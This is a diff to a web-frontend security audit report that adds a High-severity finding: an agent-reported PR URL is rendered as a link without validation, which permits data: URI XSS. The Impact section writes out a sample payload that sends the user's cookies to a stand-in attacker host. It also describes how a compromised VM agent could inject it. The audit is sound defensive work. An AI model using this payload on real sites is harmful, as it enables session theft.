@@ -26,11 +26,11 @@ The web frontend exhibits strong security posture overall: the React SPA uses sa
 | Severity | Count |
 |----------|-------|
 | Critical | 2 |
-| High | 4 |
+| High | 5 |
 | Medium | 5 |
 | Low | 4 |
 | Info | 3 |
-| **Total** | **18** |
+| **Total** | **19** |
 
 ---
 
@@ -178,6 +178,33 @@ The web frontend exhibits strong security posture overall: the React SPA uses sa
   }
   ```
 - **Remediation:** Apply the same guard used in `NotificationCenter.tsx`: only call `navigate(actionUrl)` if `actionUrl.startsWith('/')` and `!actionUrl.startsWith('//')`.
+- **Confidence:** High
+
+#### WEB-019: Unsanitized Agent-Controlled outputPrUrl Rendered as href
+
+- **Severity:** High
+- **CWE:** CWE-79 (Improper Neutralization of Input During Web Page Generation), CWE-601 (URL Redirection to Untrusted Site)
+- **Location:** `apps/web/src/pages/TaskDetail.tsx:118`, `apps/web/src/components/project-message-view/SessionHeader.tsx:522`, `apps/api/src/schemas/tasks.ts:21,89`
+- **Description:** The `outputPrUrl` field (PR URL reported by the VM agent upon task completion) flows from VM agent callback → API database → UI `<a href>` with no URL protocol validation at any layer. The valibot schema accepts it as `v.string()` with no `.url()` validation or protocol allowlist. A compromised or malicious VM agent (which holds a valid callback JWT) can inject arbitrary URLs including `data:text/html,...` payloads. React 19's `sanitizeURL` blocks `javascript:` URIs but does NOT block `data:` URIs.
+- **Impact/Exploit:** A compromised VM agent sends `{ "outputPrUrl": "data:text/html,<script>document.location='https://attacker.example/steal?c='+document.cookie</script>" }` via the task status callback. When the user clicks "View PR" in TaskDetail or SessionHeader, the browser opens a `data:text/html` page in a new tab capable of exfiltrating cookies or tokens.
+- **Evidence:**
+  ```typescript
+  // apps/api/src/schemas/tasks.ts:21 -- no URL validation
+  prUrl: v.nullable(v.string()),
+  // apps/api/src/schemas/tasks.ts:89
+  outputPrUrl: v.optional(v.string()),
+
+  // apps/web/src/pages/TaskDetail.tsx:117-124
+  <a
+    href={task.outputPrUrl}    // raw, unsanitized
+    target="_blank"
+    rel="noopener noreferrer"
+    className="text-accent"
+  >
+    {task.outputPrUrl}
+  </a>
+  ```
+- **Remediation:** Add `v.pipe(v.string(), v.url())` validation with an HTTPS-only check to `outputPrUrl` and `prUrl` in `apps/api/src/schemas/tasks.ts`. Apply `sanitizeUrl()` from `apps/web/src/lib/url-utils.ts` at both render sites as defense-in-depth.
 - **Confidence:** High
 
 ---
